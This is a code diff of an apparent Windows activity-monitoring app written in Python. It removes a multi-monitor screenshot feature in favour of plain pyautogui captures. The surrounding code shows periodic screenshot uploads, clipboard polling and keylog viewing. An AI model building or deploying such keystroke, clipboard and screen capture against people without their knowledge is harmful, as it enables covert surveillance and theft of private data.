@@ -1,3 +1,5 @@
+# backup before multiple monitor screenshot
+
 import os
 import sys
 import time
@@ -11,9 +13,6 @@ import socket
 import getpass
 import logging
 import win32con
-import win32gui
-import win32ui
-import win32api
 import platform 
 import requests
 import threading
@@ -1199,102 +1198,10 @@ def monitor_clipboard():
         time.sleep(1)  # Polling interval
 
 
-# Multi-monitor support functions
-# ----------------------------------------------------------------------------------
-# def get_monitor_info():
-#     """Get information about connected monitors for debugging"""
-#     try:
-#         # Get virtual screen metrics
-#         virtual_left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
-#         virtual_top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
-#         virtual_width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
-#         virtual_height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
-        
-#         # Get primary monitor info
-#         primary_width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
-#         primary_height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
-        
-#         monitor_info = {
-#             'virtual_screen': {
-#                 'left': virtual_left,
-#                 'top': virtual_top,
-#                 'width': virtual_width,
-#                 'height': virtual_height
-#             },
-#             'primary_monitor': {
-#                 'width': primary_width,
-#                 'height': primary_height
-#             }
-#         }
-        
-#         logging.info(f"Monitor configuration: {monitor_info}")
-#         print(f"Monitor configuration: Virtual={virtual_width}x{virtual_height}, Primary={primary_width}x{primary_height}")
-        
-#         return monitor_info
-        
-#     except Exception as e:
-#         logging.error(f"Error getting monitor info: {e}")
-#         print(f"Error getting monitor info: {e}")
-#         return None
-
 # Take a screenshot
 # ----------------------------------------------------------------------------------
-def take_screenshot_multi_monitor():
-    """Windows-specific method to capture all monitors using Win32 API"""
-    try:
-        # Get the virtual screen dimensions (all monitors combined)
-        left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
-        top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
-        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
-        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
-        
-        logging.info(f"Virtual screen dimensions: {width}x{height} at ({left}, {top})")
-        print(f"📐 Virtual screen: {width}x{height} at ({left}, {top})")
-        
-        # Validate dimensions
-        if width <= 0 or height <= 0:
-            raise ValueError(f"Invalid screen dimensions: {width}x{height}")
-        
-        # Create device contexts
-        hdesktop = win32gui.GetDesktopWindow()
-        desktop_dc = win32gui.GetWindowDC(hdesktop)
-        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
-        mem_dc = img_dc.CreateCompatibleDC()
-        
-        # Create bitmap
-        screenshot_bmp = win32ui.CreateBitmap()
-        screenshot_bmp.CreateCompatibleBitmap(img_dc, width, height)
-        mem_dc.SelectObject(screenshot_bmp)
-        
-        # Copy screen to bitmap
-        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
-        
-        # Convert to PIL Image
-        bmpinfo = screenshot_bmp.GetInfo()
-        bmpstr = screenshot_bmp.GetBitmapBits(True)
-        screenshot = Image.frombuffer(
-            'RGB',
-            (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
-            bmpstr, 'raw', 'BGRX', 0, 1
-        )
-        
-        # Clean up
-        mem_dc.DeleteDC()
-        win32gui.DeleteObject(screenshot_bmp.GetHandle())
-        img_dc.DeleteDC()
-        win32gui.ReleaseDC(hdesktop, desktop_dc)
-        
-        logging.info(f"Multi-monitor screenshot captured successfully: {screenshot.size}")
-        print(f"✅ Multi-monitor screenshot: {screenshot.size}")
-        return screenshot
-        
-    except Exception as e:
-        logging.error(f"Multi-monitor screenshot failed: {e}")
-        print(f"❌ Multi-monitor screenshot failed: {e}")
-        return None
-
 def take_screenshot():
-    """Enhanced screenshot function with multi-monitor support and active mode handling"""
+    """Enhanced screenshot function with active mode handling"""
     global last_interaction_time, is_running
     
     while True:
@@ -1305,7 +1212,6 @@ def take_screenshot():
                 #     logging.info("Skipping screenshot - workstation locked")
                 #     time.sleep(10)
                 #     continue
-                
                 # Calculate time since last interaction
                 time_since_interaction = time.time() - last_interaction_time
                 
@@ -1317,25 +1223,11 @@ def take_screenshot():
                     current_interval = screenshot_interval
                     immediate_upload = False
                 
-                # Take screenshot with multi-monitor support
+                # Take screenshot
                 timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
                 filename = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
-                
-                # Try multi-monitor method first
-                screenshot = take_screenshot_multi_monitor()
-                
-                if screenshot is not None:
-                    # Save the multi-monitor screenshot
-                    screenshot.save(filename, "PNG")
-                    logging.info(f"Multi-monitor screenshot saved: {filename}")
-                    print(f"Multi-monitor screenshot saved: {filename}")
-                else:
-                    # Fallback to pyautogui method
-                    logging.warning("Falling back to pyautogui screenshot method")
-                    print("Falling back to pyautogui screenshot method")
-                    pyautogui.screenshot(filename)
-                    logging.info(f"Fallback screenshot saved: {filename}")
-                    print(f"Fallback screenshot saved: {filename}")
+                pyautogui.screenshot(filename)
+                logging.info(f"take_screenshot-->Screenshot saved: {filename}")
                 
                 # Upload immediately if in active mode
                 if immediate_upload:
@@ -1345,12 +1237,13 @@ def take_screenshot():
                         daemon=True
                     ).start()
              
+            # with lock:
+            #     current_interval = screenshot_interval
             # Sleep for appropriate interval
             time.sleep(current_interval)
             
         except Exception as e:
             logging.error(f"Screenshot error: {str(e)}")
-            print(f"Screenshot error: {str(e)}")
             time.sleep(30)  # Backoff on errors
 
 
@@ -1603,67 +1496,6 @@ def open_copy_keylog_file(icon, item):
         print(f"Error opening log file: {e}")
         
         
-# Test multi-monitor screenshot
-# ----------------------------------------------------------------------------------
-# def test_multi_monitor_screenshot(icon, item):
-#     """Test the multi-monitor screenshot functionality"""
-#     try:
-#         logging.warning("Testing multi-monitor screenshot...")
-#         print("\n🧪 Testing multi-monitor screenshot functionality...")
-        
-#         # Get monitor info first
-#         monitor_info = get_monitor_info()
-        
-#         timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
-        
-#         # Test multi-monitor method
-#         print("📸 Testing multi-monitor method...")
-#         multi_screenshot = take_screenshot_multi_monitor()
-        
-#         if multi_screenshot is not None:
-#             multi_filename = os.path.join(screenshot_folder, f"test_multi_{timestamp}.png")
-#             multi_screenshot.save(multi_filename, "PNG")
-#             print(f"✅ Multi-monitor screenshot saved: {multi_filename}")
-#             print(f"   Size: {multi_screenshot.size}")
-        
-#         # Test pyautogui method for comparison
-#         print("📸 Testing pyautogui method for comparison...")
-#         pyautogui_filename = os.path.join(screenshot_folder, f"test_pyautogui_{timestamp}.png")
-#         pyautogui_screenshot = pyautogui.screenshot()
-#         pyautogui_screenshot.save(pyautogui_filename)
-#         print(f"✅ PyAutoGUI screenshot saved: {pyautogui_filename}")
-#         print(f"   Size: {pyautogui_screenshot.size}")
-        
-#         # Compare sizes
-#         if multi_screenshot is not None:
-#             multi_size = multi_screenshot.size
-#             pyautogui_size = pyautogui_screenshot.size
-            
-#             if multi_size[0] > pyautogui_size[0] or multi_size[1] > pyautogui_size[1]:
-#                 result_msg = "✅ Multi-monitor method captures larger area - likely capturing multiple displays!"
-#                 show_notification(APP_NAME, "Multi-monitor screenshot working correctly!")
-#             elif multi_size == pyautogui_size:
-#                 result_msg = "ℹ️ Both methods capture same size - single monitor or identical capture area"
-#                 show_notification(APP_NAME, "Screenshot methods capture same area.")
-#             else:
-#                 result_msg = "⚠️ Multi-monitor method captures smaller area - unexpected result"
-#                 show_notification(APP_NAME, "Unexpected screenshot size difference.")
-                
-#             print(f"\n📊 Comparison Results:")
-#             print(f"   Multi-monitor: {multi_size}")
-#             print(f"   PyAutoGUI: {pyautogui_size}")
-#             print(f"   {result_msg}")
-            
-#             logging.info(f"Screenshot test completed - Multi: {multi_size}, PyAutoGUI: {pyautogui_size}")
-#         else:
-#             show_notification(APP_NAME, "Multi-monitor method failed - using fallback only.")
-#             print("❌ Multi-monitor method failed")
-            
-#     except Exception as e:
-#         logging.error(f"Error testing screenshot: {e}")
-#         print(f"❌ Error testing screenshot: {e}")
-#         show_notification(APP_NAME, f"Screenshot test failed: {e}")
-
 # Open screenshot folder
 # ----------------------------------------------------------------------------------        
 def open_Screenshot_folder(icon, item):
@@ -2563,7 +2395,6 @@ def update_checkmarks(icon):
         MenuItem("View Keylog", wrap_action(open_keylog_file)),
         MenuItem("View Copied Keylog", wrap_action(open_copy_keylog_file)),
         MenuItem("View Screenshot", wrap_action(open_Screenshot_folder)),
-        # MenuItem("Test Multi-Monitor Screenshot", wrap_action(test_multi_monitor_screenshot)),
         MenuItem("View Log", wrap_action(on_open_log)),
         Menu.SEPARATOR,
         MenuItem("Check for Updates", lambda icon, item: check_for_update_async()),
@@ -2695,9 +2526,6 @@ def main():
             logging.error("Icon file not found. Notifications will not include an icon.")
             print("Icon file not found. Notifications will not include an icon.")
         show_notification(f"{APP_NAME} Started", "The application has started successfully.")
-        
-        # Log monitor configuration for debugging
-        # get_monitor_info()
         
         # Start keylogger
         # start_keylogger()
